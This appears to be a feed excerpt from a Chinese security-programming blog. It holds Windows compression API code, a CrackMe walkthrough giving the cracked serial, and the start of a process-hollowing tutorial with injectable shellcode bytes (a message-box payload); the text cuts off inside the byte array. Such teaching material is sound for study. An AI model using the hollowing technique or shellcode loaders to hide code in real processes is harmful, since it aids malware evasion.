class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n加密后数据：\n&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; dwCompreeDataLen; i++) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x &quot;</span>, pCompressData[i]);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n解密后数据\n&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; dwUnCompressDataLen; i++) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x &quot;</span>, pUnCompressData[i]);<br>&#125;<br><span class="hljs-keyword">if</span> (pUnCompressData) <br>&#123;<br><span class="hljs-keyword">delete</span>[]pUnCompressData;<br>pUnCompressData = <span class="hljs-literal">NULL</span>;<br><br>&#125;<br><span class="hljs-keyword">if</span> (pCompressData)<br>&#123;<br><span class="hljs-keyword">delete</span>[]pCompressData;<br>pCompressData = <span class="hljs-literal">NULL</span>;<br>&#125;<br>getchar();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function">BOOL <span class="hljs-title">CompressData</span><span class="hljs-params">(BYTE* pUnCompressData, DWORD dwUncompressDataLen, BYTE** ppCompressData, DWORD* pdwCompressDataLen)</span></span><br><span class="hljs-function"></span>&#123;<br>BOOL flag = FALSE;<br>NTSTATUS status = <span class="hljs-number">0</span>;<br>DWORD dwWorkSpaceSize = <span class="hljs-number">0</span>;<br>DWORD dwFragmentWorkSpaceSize = <span class="hljs-number">0</span>;<br>BYTE* pWorkSpace = <span class="hljs-literal">NULL</span>;<br>BYTE* pCompressData = <span class="hljs-literal">NULL</span>;<br>DWORD dwCompressDataLen = <span class="hljs-number">4096</span>;<br>DWORD dwFinalCompressSize = <span class="hljs-number">0</span>;<br>HMODULE hDll = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">do</span><br>&#123;<br>hDll = LoadLibraryA(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br><span class="hljs-keyword">if</span> (hDll == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;加载NTDLL失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>FN_RtlGetCompressionWorkSpaceSize RtlGetCompressionWorkSpaceSize = <br>(FN_RtlGetCompressionWorkSpaceSize)GetProcAddress(hDll, <span class="hljs-string">&quot;RtlGetCompressionWorkSpaceSize&quot;</span>);<br><span class="hljs-keyword">if</span> (RtlGetCompressionWorkSpaceSize == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取RtlGetCompressionWorkSpaceSize函数地址失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>FN_RtlCompressBuffer RtlCompressBuffer = (FN_RtlCompressBuffer)GetProcAddress(hDll, <span class="hljs-string">&quot;RtlCompressBuffer&quot;</span>);<br><span class="hljs-keyword">if</span> (RtlCompressBuffer == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取RtlCompressBuffer地址失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">//获取WORKSPACE的大小</span><br>status = RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD, &amp;dwWorkSpaceSize, &amp;dwFragmentWorkSpaceSize);<br><span class="hljs-keyword">if</span> (status!=<span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取workspace大小失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>pWorkSpace = <span class="hljs-keyword">new</span> BYTE[dwWorkSpaceSize];<br><span class="hljs-keyword">if</span> (pWorkSpace == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1申请内存失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>RtlZeroMemory(pWorkSpace, dwWorkSpaceSize);<br><span class="hljs-keyword">while</span> (TRUE) <br>&#123;<br>pCompressData = <span class="hljs-keyword">new</span> BYTE[dwCompressDataLen];<br><span class="hljs-keyword">if</span> (pCompressData == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2申请内存失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>RtlZeroMemory(pCompressData, dwCompressDataLen);<br><span class="hljs-comment">//压缩数据</span><br>RtlCompressBuffer(COMPRESSION_FORMAT_LZNT1, pUnCompressData, dwUncompressDataLen, <br>pCompressData, dwCompressDataLen, <span class="hljs-number">4096</span>, &amp;dwFinalCompressSize, (PVOID)pWorkSpace);<br><br><span class="hljs-keyword">if</span> (dwCompressDataLen &lt; dwFinalCompressSize)<br>&#123;<br><span class="hljs-keyword">if</span> (pCompressData)<br>&#123;<br><span class="hljs-keyword">delete</span>[]pCompressData;<br>pCompressData = <span class="hljs-literal">NULL</span>;<br>&#125;<br>dwCompressDataLen = dwFinalCompressSize;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>*ppCompressData = pCompressData;<br>*pdwCompressDataLen = dwFinalCompressSize;<br>flag = TRUE;<br>&#125;<span class="hljs-keyword">while</span>(FALSE);<br><span class="hljs-keyword">if</span>(pWorkSpace)<br>&#123;<br><span class="hljs-keyword">delete</span>[]pWorkSpace;<br>pWorkSpace = <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (hDll)<br>&#123;<br>FreeLibrary(hDll);<br>&#125;<br><span class="hljs-keyword">return</span> flag;<br>&#125;<br><br><span class="hljs-function">BOOL <span class="hljs-title">DeCompressData</span><span class="hljs-params">(BYTE* pCompressData, DWORD dwCompressDataLen, BYTE** ppUnCompressData, DWORD* pdwUncompressDataLen)</span></span><br><span class="hljs-function"></span>&#123;<br>BOOL flag = FALSE;<br>HMODULE hDll = <span class="hljs-literal">NULL</span>;<br>BYTE* pUnCompressData = <span class="hljs-literal">NULL</span>;<br>DWORD dwUnCompressDataLen = <span class="hljs-number">4096</span>;<br>DWORD dwFinalUnCompressSize = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">do</span><br>&#123;<br>hDll = LoadLibraryA(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br><span class="hljs-keyword">if</span> (hDll == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;加载NTDLL失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>FN_RtlDecompressBuffer RtlDecompressBuffer = (FN_RtlDecompressBuffer)GetProcAddress(hDll, <span class="hljs-string">&quot;RtlDecompressBuffer&quot;</span>);<br><span class="hljs-keyword">if</span> (RtlDecompressBuffer == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取RtlDecompressBuffer地址失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">while</span> (TRUE)<br>&#123;<br>pUnCompressData = <span class="hljs-keyword">new</span> BYTE[dwUnCompressDataLen];<br><span class="hljs-keyword">if</span> (pUnCompressData == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3申请内存失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>RtlZeroMemory(pUnCompressData, dwUnCompressDataLen);<br>RtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1, pUnCompressData, dwUnCompressDataLen, <br>pCompressData, dwCompressDataLen, &amp;dwFinalUnCompressSize);<br><span class="hljs-keyword">if</span> (dwUnCompressDataLen &lt; dwFinalUnCompressSize) <br>&#123;<br><span class="hljs-keyword">if</span> (pUnCompressData)<br>&#123;<br><span class="hljs-keyword">delete</span>[]pUnCompressData;<br>pUnCompressData = <span class="hljs-literal">NULL</span>;<br>&#125;<br>dwUnCompressDataLen = dwFinalUnCompressSize;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>*ppUnCompressData = pUnCompressData;<br>*pdwUncompressDataLen = dwFinalUnCompressSize;<br>flag = TRUE;<br><br>&#125; <span class="hljs-keyword">while</span> (FALSE);<br><span class="hljs-keyword">if</span> (hDll) &#123;<br>FreeLibrary(hDll);<br>&#125;<br><br><span class="hljs-keyword">return</span> flag;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/08/06/%E5%8E%8B%E7%BC%A9%E6%8A%80%E6%9C%AF-windows%E5%8E%8B%E7%BC%A9API/1.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>《Windows黑客编程技术详解》</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>压缩技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>160CrackMe-008</title>
    <link href="/2021/08/04/160CrackMe-008/"/>
    <url>/2021/08/04/160CrackMe-008/</url>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序直接输入一个注册码，输入错误弹出错误提示窗口。</p><p><img src="/2021/08/04/160CrackMe-008/1.png"></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>无壳，是使用VB编写的的</p><p><img src="/2021/08/04/160CrackMe-008/2.png"></p><p>使用OD直接搜索错误弹窗的提示，可以直接定位一个关键跳转。</p><p><img src="/2021/08/04/160CrackMe-008/3.png"></p><p>开始分析一下，就在上面不远处，是明文比较输入与SynTaX 2oo1</p><p><img src="/2021/08/04/160CrackMe-008/4.png"></p><p>输入SynTaX 2oo1即可成功</p><p><img src="/2021/08/04/160CrackMe-008/5.png"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>有点简单了。。。</p>]]></content>
    
    
    <categories>
      
      <category>CrackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>CrackMe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>隐藏技术-傀儡进程</title>
    <link href="/2021/08/03/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B/"/>
    <url>/2021/08/03/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h4 id="傀儡进程"><a href="#傀儡进程" class="headerlink" title="傀儡进程"></a>傀儡进程</h4><p>借着正常的软件进程或者系统进程的外壳来进行恶意的操作。</p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="GetThreadContext"><a href="#GetThreadContext" class="headerlink" title="GetThreadContext"></a>GetThreadContext</h5><p>检索指定线程的上下文</p><p>64位程序可以使用Wow64GetThreadContext检索WOW64线程的上下文。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">BOOL <span class="hljs-title">GetThreadContext</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HANDLE    hThread,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCONTEXT lpContext</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>hThread：要检索其上下文的线程的句柄。句柄必须有THREAD_GET_CONTEXT访问权限。</p><p>lpContext：指向上下文结构的指针，它接受指定线程适当的上下文。该结构中的ContextFlags成员可以指定检索线程上下文的哪些部分。上下文结构具有高度的处理器特性。</p><p>返回值：成功返回不为0，否则为0。</p><h5 id="SetThreadContext"><a href="#SetThreadContext" class="headerlink" title="SetThreadContext"></a>SetThreadContext</h5><p>设置指定线程的上下文。64位可以用Wow64SetThreadContext设置</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">BOOL <span class="hljs-title">SetThreadContext</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HANDLE        hThread,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">const</span> CONTEXT *lpContext</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>hThread：指定线程的句柄，并将设置其上下文。该句柄必须具有线程的THREAD_SET_CONTEXT权限。</p><p>lpContext：指向要在指定进程中设置上下文结构的指针。此结构中ContextFlags成员值可以指定要设置线程上下文的哪些部分。</p><p>返回值：如果设置了上下文，则返回值为非0，否则为0；</p><h5 id="ResumeThread"><a href="#ResumeThread" class="headerlink" title="ResumeThread"></a>ResumeThread</h5><p>减少线程的暂停计数。当暂停计数减到0时，恢复线程的执行。</p><figure class="highlight abnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs abnf">DWORD ResumeThread(<br>  HANDLE hThread<br>)<span class="hljs-comment">;</span><br></code></pre></div></td></tr></table></figure><p>hThread：要重新启动线程的句柄。该句柄必须具有THREAD_SUSPEND_RESUME权限。</p><p>返回值：如果成功，返回值是线程先前挂起的计数，如果失败，则返回（DWORD）-1。</p><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function">BOOL <span class="hljs-title">ReplacProcess</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszFilePath)</span></span>;<br><span class="hljs-keyword">char</span> data[] = &#123; <span class="hljs-number">0x55</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0xEC</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xEC</span> ,<span class="hljs-number">0x4C</span> ,<span class="hljs-number">0xE8</span> ,<span class="hljs-number">0x15</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x50</span><br>,<span class="hljs-number">0xE8</span> ,<span class="hljs-number">0x29</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xC4</span> ,<span class="hljs-number">0x04</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xB4</span> ,<span class="hljs-number">0x4C</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xB5</span><br>,<span class="hljs-number">0x6F</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xB6</span> ,<span class="hljs-number">0x61</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xB7</span> ,<span class="hljs-number">0x64</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xB8</span> ,<span class="hljs-number">0x4C</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xB9</span> ,<span class="hljs-number">0x69</span> ,<span class="hljs-number">0xC6</span><br>,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xBA</span> ,<span class="hljs-number">0x62</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xBB</span> ,<span class="hljs-number">0x72</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xBC</span> ,<span class="hljs-number">0x61</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xBD</span> ,<span class="hljs-number">0x72</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xBE</span><br>,<span class="hljs-number">0x79</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xBF</span> ,<span class="hljs-number">0x41</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xC0</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8D</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xB4</span> ,<span class="hljs-number">0x51</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x52</span> ,<span class="hljs-number">0xFF</span><br>,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF4</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xC4</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xC5</span> ,<span class="hljs-number">0x65</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x73</span> ,<span class="hljs-number">0xC6</span><br>,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xC7</span> ,<span class="hljs-number">0x73</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xC8</span> ,<span class="hljs-number">0x61</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xC9</span> ,<span class="hljs-number">0x67</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xCA</span> ,<span class="hljs-number">0x65</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xCB</span><br>,<span class="hljs-number">0x42</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0x6F</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xCD</span> ,<span class="hljs-number">0x78</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xCE</span> ,<span class="hljs-number">0x41</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xCF</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xC6</span><br>,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD0</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD1</span> ,<span class="hljs-number">0x73</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD2</span> ,<span class="hljs-number">0x65</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD3</span> ,<span class="hljs-number">0x72</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD4</span><br>,<span class="hljs-number">0x33</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD5</span> ,<span class="hljs-number">0x32</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD6</span> ,<span class="hljs-number">0x2E</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD7</span> ,<span class="hljs-number">0x64</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD8</span> ,<span class="hljs-number">0x6C</span> ,<span class="hljs-number">0xC6</span><br>,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD9</span> ,<span class="hljs-number">0x6C</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xDA</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8D</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xC4</span> ,<span class="hljs-number">0x50</span> ,<span class="hljs-number">0x8D</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xD0</span> ,<span class="hljs-number">0x51</span> ,<span class="hljs-number">0xFF</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF4</span><br>,<span class="hljs-number">0x50</span> ,<span class="hljs-number">0xFF</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF0</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xDC</span> ,<span class="hljs-number">0x62</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xDD</span> ,<span class="hljs-number">0x31</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xDE</span><br>,<span class="hljs-number">0x61</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xDF</span> ,<span class="hljs-number">0x63</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xE0</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xE1</span> ,<span class="hljs-number">0x69</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xE2</span> ,<span class="hljs-number">0x65</span> ,<span class="hljs-number">0xC6</span><br>,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xE3</span> ,<span class="hljs-number">0x21</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xE4</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xE8</span> ,<span class="hljs-number">0x74</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xE9</span> ,<span class="hljs-number">0x65</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xEA</span><br>,<span class="hljs-number">0x73</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xEB</span> ,<span class="hljs-number">0x74</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xEC</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6A</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8D</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xE8</span> ,<span class="hljs-number">0x52</span> ,<span class="hljs-number">0x8D</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xDC</span><br>,<span class="hljs-number">0x50</span> ,<span class="hljs-number">0x6A</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xFF</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF0</span> ,<span class="hljs-number">0x33</span> ,<span class="hljs-number">0xC0</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0xE5</span> ,<span class="hljs-number">0x5D</span> ,<span class="hljs-number">0xC3</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span><br>,<span class="hljs-number">0x64</span> ,<span class="hljs-number">0xA1</span> ,<span class="hljs-number">0x30</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x40</span> ,<span class="hljs-number">0x0C</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x40</span> ,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x40</span><br>,<span class="hljs-number">0x10</span> ,<span class="hljs-number">0xC3</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0xEC</span> ,<span class="hljs-number">0x83</span><br>,<span class="hljs-number">0xEC</span> ,<span class="hljs-number">0x2C</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0x08</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x03</span> ,<span class="hljs-number">0x51</span> ,<span class="hljs-number">0x3C</span> ,<span 